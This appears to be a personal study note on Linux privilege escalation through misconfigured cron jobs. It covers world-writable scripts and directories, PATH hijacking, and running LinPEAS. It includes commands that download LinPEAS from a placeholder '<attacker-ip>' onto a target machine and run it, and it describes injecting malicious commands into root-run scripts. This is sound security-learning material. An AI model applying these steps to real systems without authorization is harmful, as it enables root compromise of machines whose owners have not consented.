# crontabs

29/05/25

## Recall

- What is a cron job and where are they typically configured?
- Why can cron jobs lead to privilege escalation?
- How can writable scripts or directories be abused in scheduled tasks?
- What is the risk of using unqualified command names in cron jobs?
- How does LinPEAS help identify vulnerable cron jobs?

## Notes

### What it is

**Cron** is the task scheduling system in Unix/Linux environments, designed to automate repetitive tasks like backups, updates, or scans. A **cron job** is a command or script scheduled to run periodically — hourly, daily, weekly, etc.

These jobs can belong to either the system or individual users:

- `crontab -l` → lists user-specific cron jobs
- `/etc/crontab` → system-wide scheduled jobs
- `/etc/cron.d/`, `/etc/cron.daily/`, `/etc/cron.hourly/` → job directories used by the system

Since many cron jobs are executed by `root`, **misconfigurations** can lead to privilege escalation.

For example, if a cron job executes a script that is **writable by any user**, an attacker can inject malicious commands:

```sql
-rwxrwxrwx 1 root root 1234 /opt/backup.sh
```

Even if the file is read-only, a world-writable directory can allow file replacement:

```sql
drwxrwxrwx 2 root root /opt/
```

Another common misconfiguration is when the cron job calls an unspecific binary that relies on `$PATH`. If the attacker can inject their own version of the command in $PATH, it gets executed instead:

```sql
* * * * * root backup
```

If `backup` isn’t referenced with a full path, this can be hijacked.

### How to exploit it

To exploit a cron job vulnerability, you first need to identify it. While manual analysis is possible, it’s common to use automated tools like **LinPEAS**.

Host LinPEAS on your local machine:

```sql
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 8000
```

Download and run it on the target machine:

```sql
wget http://<attacker-ip>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Look for suspicious cron jobs during execution:

```sql
╔══════════╣ Interesting Writable Files owned by root or other users
╔══════════╣ World Writable Cron Files
╔══════════╣ Scheduled Cron Jobs
╔══════════╣ Analyzing Cron Jobs
```

These often highlight scripts or binaries with improper permissions being executed by root.

Once a vulnerable job is found, modify the script or insert a malicious executable in the path it uses, and wait for the cron daemon to trigger it.

## Summary

**Cron jobs** are scheduled tasks in Linux systems. If misconfigured, they can be exploited for privilege escalation — especially when executed by root and tied to writable files or ambiguous commands. Tools like LinPEAS help automate the discovery of such flaws. Once a weak cron job is identified, injecting or replacing the script can give the attacker code execution as root.